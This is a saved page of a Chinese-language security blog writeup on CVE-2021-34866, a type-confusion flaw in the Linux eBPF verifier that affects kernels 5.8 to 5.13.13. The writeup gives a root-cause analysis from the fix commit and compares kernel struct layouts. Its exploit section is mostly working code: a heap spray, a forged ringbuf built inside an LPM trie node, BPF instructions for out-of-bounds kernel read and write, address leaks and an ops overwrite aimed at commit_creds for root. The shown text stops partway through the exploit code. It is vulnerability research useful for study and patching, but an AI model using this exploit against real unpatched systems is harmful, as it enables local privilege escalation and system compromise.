<!DOCTYPE html>
<!-- saved from url=(0060)https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/ -->
<html lang="zh-TW"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Hexo 3.9.0">
  
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog.hexrabbit.io/img/favicon.png">
  <link rel="icon" type="image/png" href="https://blog.hexrabbit.io/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="">
  <meta name="author" content="HexRabbit">
  <meta name="keywords" content="pwn, reversing, code">
  <meta name="og:image" content="https://blog.hexrabbit.io/img/banner.png">
  <meta name="og:site_name" content="HexRabbit&#39;s Blog">
  <meta name="og:url" content="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/">
  <meta property="og:image:width" content="1370">
  <meta property="og:image:height" content="717">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:creator" content="@h3xrabbit">
  <meta name="twitter:image" content="https://blog.hexrabbit.io/img/banner.png">
  <meta name="twitter:url" content="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/">
  <meta name="twitter:title" content="CVE-2021-34866 Writeup - HexRabbit&#39;s Blog">
  
    <meta name="og:type" content="article">
    <meta name="og:title" content="CVE-2021-34866 Writeup - HexRabbit&#39;s Blog">
    <meta name="og:description" content="CVE-2021-34866 Writeup幾天前在 Twitter 上看到 @flatt_secu">
    <meta name="twitter:decription" content="CVE-2021-34866 Writeup幾天前在 Twitter 上看到 @flatt_secu">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <title>CVE-2021-34866 Writeup - HexRabbit's Blog</title>

  <style class="anchorjs"></style><link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/bootstrap.min.css">


  <link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/github-markdown.min.css">
  <link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/hint.min.css">

  
    <link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/tomorrow-night-eighties.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/font_1749284_yg9cfy8wd6.css">

<link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/font_1736178_pjno9b9zyxs.css">

<link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/main.css">

<!-- 自定义样式保持在最底部 -->


  <script async="" src="./2021 - CVE-2021-34866 Writeup_files/analytics.js.下載"></script><script src="./2021 - CVE-2021-34866 Writeup_files/utils.js.下載"></script>
<link rel="alternate" href="https://blog.hexrabbit.io/atom.xml" title="HexRabbit&#39;s Blog" type="application/atom+xml">
<link rel="alternate" href="https://blog.hexrabbit.io/rss2.xml" title="HexRabbit&#39;s Blog" type="application/rss+xml">
</head>


<body>
  <header style="height: 45vh;">
    <nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="https://blog.hexrabbit.io/">&nbsp;<strong>HexRabbit's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax="true" style="background: url(&quot;/img/post.jpg&quot;) center center / cover no-repeat; transform: translate3d(0px, 0px, 0px);">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">CVE-2021-34866 Writeup&nbsp;</span><span class="typed-cursor h2 typed-cursor--blink">_</span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2021-11-03 15:05">
      2021年11月3日 15:05
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.2k words
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      16
       min
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <div class="post-content mx-auto" id="post">
            
            <article class="markdown-body">
              <h1 id="CVE-2021-34866-Writeup"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#CVE-2021-34866-Writeup" class="headerlink" title="CVE-2021-34866 Writeup"></a>CVE-2021-34866 Writeup<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#CVE-2021-34866-Writeup" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h1><p>幾天前在 Twitter 上看到 <a href="https://twitter.com/flatt_security" target="_blank" rel="noopener">@flatt_security</a> 分享這個漏洞，感覺蠻有趣且加上我好久沒寫文，就拿來練習一下了，沒想到時隔快一年，又挑到 Ryota Shiga (<a href="https://twitter.com/ga_ryo_" target="_blank" rel="noopener">@Ga_ryo_</a>) 大佬發的漏洞來練習</p>
<p>這次是一個影響 Linux kernel v5.8 - v5.13.13 的 eBPF type confusion 漏洞</p>
<p>基本上這會是個相對簡短一點的文章，<br>如果對 eBPF 不熟的朋友們可以先去看看我的前一篇文 <a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/">ZDI-20-1440-writeup</a></p>
<h2 id="TL-DR"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#TL-DR" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p><a href="https://github.com/HexRabbit/CVE-writeup/blob/master/CVE-2021-34886/exploit.c" target="_blank" rel="noopener">https://github.com/HexRabbit/CVE-writeup/blob/master/CVE-2021-34886/exploit.c</a></p>
<h2 id="Root-cause-analysis"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Root-cause-analysis" class="headerlink" title="Root cause analysis"></a>Root cause analysis<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Root-cause-analysis" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>這次沒有 blog post 可以看了，首先來看一下 <a href="https://www.zerodayinitiative.com/advisories/ZDI-21-1148/" target="_blank" rel="noopener">ZDI report</a> 上面是怎麼寫的</p>
<div class="hljs"><pre><code class="hljs text">The issue results from the lack of proper validation of user-supplied eBPF programs, 
which can result in a type confusion condition.</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>雖然得知這是一個 type confusion 的漏洞，但這個敘述相當模糊，也不知道問題究竟是出在哪裡，所以接著我去看了修正這個漏洞的 <a href="https://github.com/torvalds/linux/commit/5b029a32cfe4600f5e10e36b41778506b90fd4de" target="_blank" rel="noopener">commit</a></p>
<p>其中提到幾個重點:</p>
<ol>
<li>在 <code>check_map_func_compatibility()</code> 這個 function 當中，有針對 <code>map -&gt; helper</code> 進行 type match，但缺少部分反向的 <code>helper -&gt; map</code>  type match</li>
<li>由於 1. 的問題，這導致 <code>bpf_ringbuf_*()</code> 一類的 helper functions 可以接受使用者傳入其他型別的 bpf map，也就是 <code>BPF_MAP_TYPE_RINGBUF</code> 以外的 map type，進而造成 type confusion</li>
</ol>
<blockquote>
<p>為什麼要設計成正反向各做一次 type matching 的原因我不是很清楚，由於這個設計，第一個 switch case 裡面並沒有包含所有的 map type，且可以注意到 default case 不會觸發 error</p>
</blockquote>
<div class="hljs"><pre><code class="hljs diff">static int check_map_func_compatibility(struct bpf_verifier_env *env,

    /* We need a two way check, first is from map perspective ... */
    switch (map-&gt;map_type) {
    
    case BPF_MAP_TYPE_RINGBUF:
        if (func_id != BPF_FUNC_ringbuf_output &amp;&amp;
            func_id != BPF_FUNC_ringbuf_reserve &amp;&amp;
<span class="hljs-deletion">-           func_id != BPF_FUNC_ringbuf_submit &amp;&amp;</span>
<span class="hljs-deletion">-           func_id != BPF_FUNC_ringbuf_discard &amp;&amp;</span>
            func_id != BPF_FUNC_ringbuf_query)
            goto error;
        break;
        
    }

    /* ... and second from the function itself. */
    switch (func_id) {

<span class="hljs-addition">+   case BPF_FUNC_ringbuf_output:</span>
<span class="hljs-addition">+   case BPF_FUNC_ringbuf_reserve:</span>
<span class="hljs-addition">+   case BPF_FUNC_ringbuf_query:</span>
<span class="hljs-addition">+       if (map-&gt;map_type != BPF_MAP_TYPE_RINGBUF)</span>
<span class="hljs-addition">+           goto error;</span>
<span class="hljs-addition">+       break;</span>
    case BPF_FUNC_get_stackid:
        if (map-&gt;map_type != BPF_MAP_TYPE_STACK_TRACE)
            goto error;
    
    ...
    
    default:
        break;
    }

    return 0;</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<h2 id="Weaponize-the-bug"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Weaponize-the-bug" class="headerlink" title="Weaponize the bug"></a>Weaponize the bug<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Weaponize-the-bug" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>至此我們可以得知這個漏洞存在於 verifier 當中，所以觸發的方式基本上與過往的漏洞相似，要透過 bpf program 進行攻擊，但還不知道該如何利用這個看似相當強大的 type confusion，總之先看一下 <code>bpf_ringbuf_*()</code> 這些 helper function 可以做到些什麼</p>
<p><code>bpf_ringbuf_*()</code> 等相關 helper function 被定義在 <a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c" target="_blank" rel="noopener">kernel/bpf/ringbuf.c</a> 當中，其透過 <code>BPF_CALL_*</code> macro 定義並讓 bpf program 可以直接透過 <code>BPF_CALL</code> 進行呼叫，此外，用來給 verfier 檢查的 argument 的型別資訊被放在 <code>bpf_ringbuf_*_proto</code> 變數當中</p>
<p>例如這是 <code>bpf_ringbuf_query</code> 的定義</p>
<div class="hljs"><pre><code class="hljs c">BPF_CALL_2(bpf_ringbuf_query, struct bpf_map *, <span class="hljs-built_in">map</span>, u64, flags)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_ringbuf</span> *<span class="hljs-title">rb</span>;</span>

    rb = container_of(<span class="hljs-built_in">map</span>, struct bpf_ringbuf_map, <span class="hljs-built_in">map</span>)-&gt;rb;

    <span class="hljs-keyword">switch</span> (flags) {
    <span class="hljs-keyword">case</span> BPF_RB_AVAIL_DATA:
        <span class="hljs-keyword">return</span> ringbuf_avail_data_sz(rb);
    <span class="hljs-keyword">case</span> BPF_RB_RING_SIZE:
        <span class="hljs-keyword">return</span> rb-&gt;mask + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">case</span> BPF_RB_CONS_POS:
        <span class="hljs-keyword">return</span> smp_load_acquire(&amp;rb-&gt;consumer_pos);
    <span class="hljs-keyword">case</span> BPF_RB_PROD_POS:
        <span class="hljs-keyword">return</span> smp_load_acquire(&amp;rb-&gt;producer_pos);
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}

<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_proto</span> <span class="hljs-title">bpf_ringbuf_query_proto</span> = {</span>
    .func       = bpf_ringbuf_query,
    .ret_type   = RET_INTEGER,
    .arg1_type  = ARG_CONST_MAP_PTR,
    .arg2_type  = ARG_ANYTHING,
};</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>稍微研究一下便可以對於怎麼利用這些 helper function 有個大概的輪廓:</p>
<ul>
<li><a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L351" target="_blank" rel="noopener">bpf_ringbuf_reserve</a><ul>
<li>根據使用者傳入的 size，回傳一個大小為 size 的 buffer (verifier 會得知 size 資訊)</li>
<li>如果可以控到 <code>mask</code>, <code>consumer_pos</code>, <code>producer_pos</code> 便可以讓他在 kernel heap 上 return 任意大小的 buffer，便可以用來進行越界讀寫</li>
</ul>
</li>
<li><a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L424" target="_blank" rel="noopener">bpf_ringbuf_output</a><ul>
<li>沒啥用</li>
</ul>
</li>
<li><a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L452" target="_blank" rel="noopener">bpf_ringbuf_query</a><ul>
<li>如果可以控到 <code>mask</code>，有機會透過 <code>BPF_RB_RING_SIZE</code> 這個 flag 去 leak heap 上的資料 (<code>rb-&gt;mask + 1</code>)</li>
</ul>
</li>
</ul>
<p>仔細觀察便會發現可以被用來進行 type confusion 的三個 function 皆會操作到 <code>bpf_ringbuf_map</code> 中的 <code>.rb</code> 這個 field，他是一個型別為 <code>struct bpf_ringbuf *</code> 的指標，由於指標取值只要失敗便會造成 kernel crash，所以首先必須得要先找到一個 structure 滿足這個要求</p>
<p>雖然說在 commit 當中提到「function 可以接受使用者傳入其他型別的 bpf map，也就是 <code>BPF_MAP_TYPE_RINGBUF</code> 以外的 map type」，但實際上我們能夠選擇的 map type 相當有限，因為 <code>check_map_func_compatibility()</code> 在第一次的檢查中就對不少 map type 和使用的 function id 進行配對了</p>
<p>把被 <code>check_map_func_compatibility()</code> 的第一次 switch case 當中檢查過的 map type 剔除掉之後，我們還剩下以下幾種選擇:</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">BPF_MAP_TYPE_PERCPU_HASH
</span><span class="hljs-keyword">BPF_MAP_TYPE_PERCPU_ARRAY
</span><span class="hljs-keyword">BPF_MAP_TYPE_LPM_TRIE
</span><span class="hljs-keyword">BPF_MAP_TYPE_STRUCT_OPS
</span><span class="hljs-keyword">BPF_MAP_TYPE_LRU_HASH
</span><span class="hljs-keyword">BPF_MAP_TYPE_ARRAY
</span><span class="hljs-keyword">BPF_MAP_TYPE_LRU_PERCPU_HASH
</span><span class="hljs-keyword">BPF_MAP_TYPE_HASH
</span><span class="hljs-keyword">BPF_MAP_TYPE_UNSPEC</span></code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>透過篩選之後，最後我採用 <code>BPF_MAP_TYPE_LPM_TRIE</code> 這個 map type 作為觸發 type confusion 時所使用的 map type，原因是</p>
<ul>
<li><code>struct bpf_ringbuf *rb</code> 的位置上剛好有 <code>struct lpm_trie_node __rcu *root</code> 這個指標</li>
<li><code>struct lpm_trie_node</code> 的 <code>u8 data[];</code> 是一個 user 完全可控的不定長度 array (大小可控)，透過他可以控制 <code>struct bpf_ringbuf</code> 當中的不少 field，讓我們可以很輕易的操控 <code>bpf_ringbuf_*()</code> 的執行流程</li>
</ul>
<p><code>bpf_ringbuf_map</code> v.s. <code>lpm_trie</code></p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_ringbuf_map</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_ringbuf</span> *<span class="hljs-title">rb</span>;</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lpm_trie</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span>              <span class="hljs-title">map</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lpm_trie_node</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">root</span>;</span>
    <span class="hljs-keyword">size_t</span>                      n_entries;
    <span class="hljs-keyword">size_t</span>                      max_prefixlen;
    <span class="hljs-keyword">size_t</span>                      data_size;
    <span class="hljs-keyword">spinlock_t</span>                  lock;
};</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p><code>bpf_ringbuf</code> v.s. <code>lpm_trie_node</code></p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_ringbuf</span> {</span>
    <span class="hljs-keyword">wait_queue_head_t</span>          waitq;                <span class="hljs-comment">/*     0    24 */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">irq_work</span>            <span class="hljs-title">work</span>;</span>                 <span class="hljs-comment">/*    24    24 */</span>
    u64                        mask;                 <span class="hljs-comment">/*    48     8 */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> * *            <span class="hljs-title">pages</span>;</span>                <span class="hljs-comment">/*    56     8 */</span>
    <span class="hljs-keyword">int</span>                        nr_pages;             <span class="hljs-comment">/*    64     4 */</span>
    <span class="hljs-keyword">spinlock_t</span>                 spinlock __attribute__((__aligned__(<span class="hljs-number">64</span>))); <span class="hljs-comment">/*   128     4 */</span>
    <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>          consumer_pos __attribute__((__aligned__(<span class="hljs-number">4096</span>))); <span class="hljs-comment">/*  4096     8 */</span>
    <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>          producer_pos __attribute__((__aligned__(<span class="hljs-number">4096</span>))); <span class="hljs-comment">/*  8192     8 */</span>
    <span class="hljs-keyword">char</span>                       data[] __attribute__((__aligned__(<span class="hljs-number">4096</span>))); <span class="hljs-comment">/* 12288     0 */</span>
} __attribute__((__aligned__(<span class="hljs-number">4096</span>)));

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lpm_trie_node</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span>       <span class="hljs-title">rcu</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">aligned__</span>(8)));</span> <span class="hljs-comment">/*     0    16 */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lpm_trie_node</span> *     <span class="hljs-title">child</span>[2];</span>             <span class="hljs-comment">/*    16    16 */</span>
    u32                        prefixlen;            <span class="hljs-comment">/*    32     4 */</span>
    u32                        flags;                <span class="hljs-comment">/*    36     4 */</span>
    u8                         data[];               <span class="hljs-comment">/*    40     0 */</span>
} __attribute__((__aligned__(<span class="hljs-number">8</span>)));</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<h2 id="Exploit"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Exploit" class="headerlink" title="Exploit"></a>Exploit<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Exploit" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>接下來便可以開始進行 exploit 了，流程大致如下</p>
<ul>
<li>利用 <code>BPF_MAP_TYPE_LPM_TRIE</code> 進行 type confusion，並利用 <code>lpm_trie_node</code> 構造出 <code>bpf_ringbuf</code></li>
<li>調整 <code>bpf_ringbuf</code> 的各個 field 用於 bypass 檢查</li>
<li>在 bpf program 中呼叫 <code>bpf_ringbuf_reserve()</code> 並傳入一個極大的 size 讓其回傳一個可以越界寫的 array</li>
<li>透過 heap spray <code>bpf_array</code> 讓任意一個 <code>bpf_array</code> 落在我們能夠越界寫的 buffer 後面</li>
<li>利用 buffer 越界讀寫 leak kernel address 以及寫掉後方 <code>bpf_array</code> 的 <code>array_ops</code></li>
<li>從所有拿來 spray 的 bpf map 當中找出哪個是我們越界寫到的 <code>bpf_array</code></li>
<li>最後套 <code>commit_creds(&amp;init_cred)</code> 提權</li>
</ul>
<p>首先透過 <code>bpf_create_map()</code> 建立一個型別為 <code>BPF_MAP_TYPE_LPM_TRIE</code> 的 bpf map 用來進行 type confusion，並讓他的 value_size 足夠覆蓋到整個 <code>struct bpf_ringbuf</code> (我選擇的是 0x3000)，同時在前後 spray 上多個 <code>bpf_array</code> 以利後續利用</p>
<blockquote>
<p>注意到一開始建立好 map 的時候，<code>struct lpm_trie_node *root</code> 會是 <code>NULL</code>，需要透過 <code>bpf_update_elem()</code> 去手動添加 node 才會幫他 allocate 一塊空間</p>
</blockquote>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;

<span class="hljs-comment">/* heap spray */</span>
<span class="hljs-keyword">for</span> (; i &lt; <span class="hljs-number">6</span>; ++i) {
  ctrl_mapfds[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
}

<span class="hljs-keyword">int</span> key_size = <span class="hljs-number">8</span>; <span class="hljs-comment">// must &gt; 4+1</span>
<span class="hljs-keyword">int</span> vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_LPM_TRIE, key_size, <span class="hljs-number">0x3000</span>, <span class="hljs-number">1</span>, BPF_F_NO_PREALLOC);
<span class="hljs-keyword">if</span> (vuln_mapfd &lt; <span class="hljs-number">0</span>) {
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"[-] failed to create trie map"</span>);
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
}

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_ringbuf</span> *<span class="hljs-title">rb</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">bpf_ringbuf</span> *)(<span class="hljs-title">data</span> - 0<span class="hljs-title">x2c</span>);</span>
rb-&gt;mask = <span class="hljs-number">0xfffffffffffffffe</span>;
rb-&gt;consumer_pos = <span class="hljs-number">0</span>;
rb-&gt;producer_pos = <span class="hljs-number">0</span>;

<span class="hljs-keyword">size_t</span> key = <span class="hljs-number">0</span>; <span class="hljs-comment">// index 0 (root node)</span>
<span class="hljs-keyword">int</span> ret = bpf_update_elem(vuln_mapfd, &amp;key, data, <span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) {
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"[-] failed to update trie map"</span>);
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
}

<span class="hljs-comment">/* heap spray */</span>
<span class="hljs-keyword">for</span> (; i &lt; ARRAY_SIZE(ctrl_mapfds); ++i) {
  ctrl_mapfds[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>由於接下來要透過 <code>lpm_trie_node</code> 當中的 <code>data[]</code> 去控制 <code>bpf_ringbuf_reserve()</code>，需要先設定好 <code>bpf_ringbuf</code> 當中的 <code>mask</code>, <code>consumer_pos</code>, <code>producer_pos</code> 這幾個 field</p>
<p>這可以讓我們繞過 <a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L305" target="_blank" rel="noopener">__bpf_ringbuf_reserve()</a> 當中的:</p>
<ul>
<li><p>size 檢查</p>
<div class="hljs"><pre><code class="hljs c">len = round_up(<span class="hljs-built_in">size</span> + BPF_RINGBUF_HDR_SZ, <span class="hljs-number">8</span>);
<span class="hljs-keyword">if</span> (len &gt; rb-&gt;mask + <span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>
</li>
<li><p>ringbuf 剩餘空間檢查</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (new_prod_pos - cons_pos &gt; rb-&gt;mask) {
    spin_unlock_irqrestore(&amp;rb-&gt;spinlock, flags);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

</li>
</ul>
<p>接著是 bpf program 的部分，</p>
<p>首先傳入剛剛建立好用於 type confusion 的 bpf map fd，設定 size 為一個極大值 (<code>0x3fffffff</code>)，並呼叫 <code>bpf_ringbuf_reserve()</code> 讓他回傳一個能在 bpf program 當中越界讀寫的 heap address</p>
<div class="hljs"><pre><code class="hljs c">BPF_LD_MAP_FD(BPF_REG_1, vuln_mapfd),
BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">0x3fffffff</span>),
BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0x0</span>),
BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_reserve),
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), <span class="hljs-comment">/* must check NULL case */</span>
BPF_EXIT_INSN(),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>透過越界讀寫從下一個 <code>bpf_array</code> leak kernel base / heap 地址</p>
<div class="hljs"><pre><code class="hljs c">BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

<span class="hljs-comment">/* get neighbor bpf_array address */</span>
BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, <span class="hljs-number">0x4000</span> - <span class="hljs-number">0x3008</span>),

<span class="hljs-comment">/* get buffer address */</span>
BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, <span class="hljs-number">0xc0</span>),
BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, <span class="hljs-number">0xc0</span> + <span class="hljs-number">0x4000</span> - <span class="hljs-number">0x3008</span>),

<span class="hljs-comment">/* get kernel base */</span>
BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, <span class="hljs-number">0</span>),
BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, array_map_ops_off),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>在 buffer 上偽造 <code>bpf_map_ops</code>，並將 <code>bpf_array.map.ops</code> 寫掉改成指向他，再來便可以透過替換其中的兩個 function 來達成 <code>commit_creds(&amp;init_cred);</code></p>
<ul>
<li><code>.map_delete_elem = fd_array_map_delete_elem</code></li>
<li><code>.map_fd_put_ptr = commit_creds</code><blockquote>
<p>詳情請見 <a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap">ZDI-20-1440-writeup</a></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>這裡有額外還原一個 <code>array_map_lookup_elem()</code> 到偽造的 <code>bpf_map_ops</code> 上</p>
</blockquote>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* put &amp;init_cred onto bpf_array.value[0] */</span>
BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
